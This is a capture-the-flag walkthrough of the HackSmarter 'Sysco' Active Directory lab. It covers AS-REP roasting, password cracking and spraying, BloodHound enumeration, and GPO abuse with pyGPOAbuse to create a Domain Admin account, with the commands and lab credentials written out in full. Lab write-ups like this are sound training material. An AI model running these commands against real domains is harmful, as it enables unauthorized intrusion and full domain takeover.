---
title: "HackSmarter Sysco Walkthrough  "
date: 2026-05-31 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="1600" height="896" alt="image" src="https://github.com/user-attachments/assets/ba202b60-5166-453a-8489-adbcfe940add" />


## Scenario : 

Sysco is a Managed Service Provider that has tasked you to perform an external penetration testing on their active directory domain. You must obtain initial foothold, move laterally and escalate privileges while evading Antivirus detection to obtain administrator privileges.

## Objectives and Scope

The core objective of this external penetration test is to simulate a realistic, determined adversary to achieve Domain Administrator privileges within Sysco's Active Directory (AD) environment. Starting from an external position, we will focus on obtaining an initial foothold, performing lateral movement, and executing privilege escalation while successfully evading Antivirus (AV) and other security controls. This is a red-team exercise to find security weaknesses before a real attacker does.

## Scneraio : 

### Foothold : 

As usual we start with an nmap scan : 

```bash
export target=10.1.240.197
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt
```

<img width="1169" height="600" alt="image" src="https://github.com/user-attachments/assets/f75aaa11-d41a-40fd-92b8-fa75c68e0ab5" />

This is obviously the Domain Controller , from kerberos , ldap and dns , since this is an AD machine , i like to follow this quick checklist from my methdology : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now firt thing first , we should add the Domain name as well as the Hostname to our /etc/hosts files : 

<img width="1109" height="389" alt="image" src="https://github.com/user-attachments/assets/3d0a857e-eef9-4b95-b6fe-0cc696f1af05" />


After that i tried to get some set of users we can test for ASREPROASTING , for this i checked anonymous access as well as the guest account : 

<img width="1061" height="692" alt="image" src="https://github.com/user-attachments/assets/fdcfd4bb-251e-4578-9177-662fcbfe7dff" />

Sadly this didn't work , so i moved to testing ldap more thoroughly using ldapsearch but that didn't return anything useful either . 

We already saw that port 80 was open , maybe we can get a list of usernames to test from there (Team members or something like that) .

<img width="1457" height="808" alt="image" src="https://github.com/user-attachments/assets/04098c73-f2c9-45f7-b64e-5349a8bf9810" />

We find some usernames , now first thing we should do is generate a list of combinations using these names , for this i used a tool called username anarchy , but there are other alternatives . 

```bash
https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py
python3 username-generator.py -u username.txt -o genrated_username.txt
Or 
https://github.com/urbanadventurer/username-anarchy
```

<img width="1078" height="653" alt="image" src="https://github.com/user-attachments/assets/76ca8c20-67ae-4745-b025-f9809263d498" />

Now that we generated a list of combinations , we can use Kerberute to validate these usernames . 

```bash
kerbrute userenum 2 --dc $target -d SYSCO.LOCAL
```

<img width="1092" height="579" alt="image" src="https://github.com/user-attachments/assets/2cc56f12-acef-4b56-bbdb-25e16fbe2bbd" />

Perfect we get 3 valid users . 

Before we move to something else , since this is a web app , we should always Fuzz for directories , maybe there are some endpoints that we missed :

<img width="1564" height="413" alt="image" src="https://github.com/user-attachments/assets/25460785-2173-4567-8412-a723a70881ef" />

We do find the /roundcube endpoint , which is a redirect to a login page : 

<img width="1141" height="588" alt="image" src="https://github.com/user-attachments/assets/7bfadbbc-dc51-42ae-96fc-01f4b0d33a90" />

For now , we can test for ASREPROASTING against the users that we validated earlier , if we get a Hash we can try and crack it using John . 

```bash
impacket-GetNPUsers  SYSCO.LOCAL/ -dc-ip $target -usersfile Valid_Users -outputfile Hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt Hashes.txt 
```

<img width="1537" height="734" alt="image" src="https://github.com/user-attachments/assets/1bb14b6c-ff7d-44fd-bce2-ca43abfcb1fd" />

Perfect we get our Foothold :) 

First i checked the shares , but i only found the default ones , then i checked to see if there are users that we can perform kerberoasting against . 

<img width="1288" height="591" alt="image" src="https://github.com/user-attachments/assets/9db6f2f6-b22b-499a-9a1e-891433f51322" />

But that didn't return anything useful either , so i used Bloodhound to try and check if our user has any useful ACLs that we can abuse . (our user can't RDP or Winrm to the machine) . 

<img width="1364" height="372" alt="image" src="https://github.com/user-attachments/assets/18473677-69f7-4750-a05e-92f0f360188d" />

Here are the commands to setup BloodHound , (For the ingestor i used nxc) :

```bash
# To get the ZIP file :
nxc ldap $target -u 'junior.analyst' -p 'Galaxy123!' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```
Looking at Bloodhound , our user has no Outbound control over objects , and the groups don't hold any important privilegs as well .

<img width="1422" height="495" alt="image" src="https://github.com/user-attachments/assets/d8adceb0-29a2-41e7-baec-812a4f4f91a8" />

Looking at what we got the only thing left is the login page we found earlier . Remember the /roundcube endpoint that we found earlier , we can try to login using the creds that we found .

<img width="1300" height="596" alt="image" src="https://github.com/user-attachments/assets/83456f52-00e3-4739-a64c-1bec366fbe48" />

Upon logging in , we see that this is a web mail , let's check the emails maybe they contain sensitive information . We found this email that was sent to lainey , which contains a config file that we can download . 

<img width="906" height="531" alt="image" src="https://github.com/user-attachments/assets/84c81f6e-443a-4ee5-98d8-6d3f1fc4104d" />

In the router's config file that we downloaded , we find a Hash . 

<img width="1007" height="619" alt="image" src="https://github.com/user-attachments/assets/a27c1d91-ddce-4e99-9007-2d7f5518dd8c" />

We can use Haiti to identify the hash type , or just use John and hope it can detect it by itself . In our case John was able to crack it pretty easily . 

<img width="1079" height="347" alt="image" src="https://github.com/user-attachments/assets/86f5f6ce-8d04-48f9-8736-f27d1964ebaa" />

Now that we got this new password , we can spray it across the user list we gathered from earlier , we can also use nxc to generate a list of ALL the other users on the domain . 

```bash
nxc smb $target -u jack.dowland  -p musicman1 --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt 
```

<img width="1433" height="412" alt="image" src="https://github.com/user-attachments/assets/7fca5c62-d167-40ea-ac36-f206adf45fc6" />

Nice we compromised a new user : "lainey.moore:Chocolate1" This user doesn't have any Outbound control over objects but he can Winrm and RDP to the machine since he is part of the Remote Management as well as RDP group . 

<img width="1504" height="440" alt="image" src="https://github.com/user-attachments/assets/da1c2615-431b-4483-82d7-4d0f74efd1a4" />

Let's login via RDP : 

<img width="1021" height="544" alt="image" src="https://github.com/user-attachments/assets/1aa4ebbe-eeb1-4d1e-955f-5da7e4239783" />

We first find the user flag on the Desktop , if we navigate the file system , we find that there are 2 putty exe on the Document Folder , one of them is a Shortcut , looking at the proprieties :

<img width="968" height="469" alt="image" src="https://github.com/user-attachments/assets/ad29ea7f-b74f-4f9d-8245-1c5d18f0a813" />

### Privilege Escalation : 

We found the of the netadmin user to login via Putty , we can attempt to spray this password across all users and hope we get a match . 

<img width="1493" height="240" alt="image" src="https://github.com/user-attachments/assets/65aee754-e312-4de9-ae60-6635ce746f0f" />

Perfect we found the password for Greg , this user has Full control over the GPO , since he is part of the Group Policy Group . 

<img width="1554" height="534" alt="image" src="https://github.com/user-attachments/assets/ae89514a-3091-433e-8279-9f2bec9dd4bb" />

Found multiple ways to abuse Generic All over the GPO , i found this tool called gpoabuse :

```bash
https://github.com/Hackndo/pyGPOAbuse
```

The default action will be to scheduele a Task that will run as System , the task will create a new user "John" that is part of Domain Admins . 

<img width="1040" height="318" alt="image" src="https://github.com/user-attachments/assets/b06c49b5-9067-45d5-8603-9e78d1606c7e" />

I used this tool to create a new user called 'Elmehdi' with the password WEAK123. , and put it in the Domain Admins . for this we just need the GPO ID , which can be found in the SYSVOL folder , or simply just use Bloodhound .

<img width="906" height="417" alt="image" src="https://github.com/user-attachments/assets/c6e8f6b0-177d-4612-9e13-df406cd2dd09" />

```bash
==> First we create the user :
python pygpoabuse.py -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -dc-ip $target -command 'net user ELMEHDI Password123. /add /domain' SYSCO.LOCAL/greg.shields:'5y5coSmarter2025!!!'

==> Then we add our user the Domain Admins group .
python pygpoabuse.py -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -dc-ip $target -command 'net group "Domain Admins" ELMEHDI /add /domain' SYSCO.LOCAL/greg.shields:'5y5coSmarter2025!!!' -f
```
<img width="1910" height="325" alt="image" src="https://github.com/user-attachments/assets/13107fc7-54d0-40be-80a1-a23e01107d1a" />

Then : 

<img width="1908" height="457" alt="image" src="https://github.com/user-attachments/assets/bc05c598-0cd8-4ca8-b4ca-1d7894014f38" />

Either , we wait for it to execute or we can update the GPO from our RDP session as the Greg user :

<img width="1229" height="505" alt="image" src="https://github.com/user-attachments/assets/040de601-6af0-49a5-9636-db967aaea9cc" />

Now that we updated the GPO we see in the screen above that it says *pwnd!* which means it is Admin on the machine (The DC in this case) . 

<img width="1823" height="501" alt="image" src="https://github.com/user-attachments/assets/2264d06e-0704-485c-b193-bf12c16f6467" />

Or we could just login via our new user creds and get the Admin flag . 

<img width="982" height="764" alt="image" src="https://github.com/user-attachments/assets/9b1048bf-6f3c-45d2-9f61-fd800f47c5e3" />

That was it for this Lab , hope you learned something , see you in the next one :) 
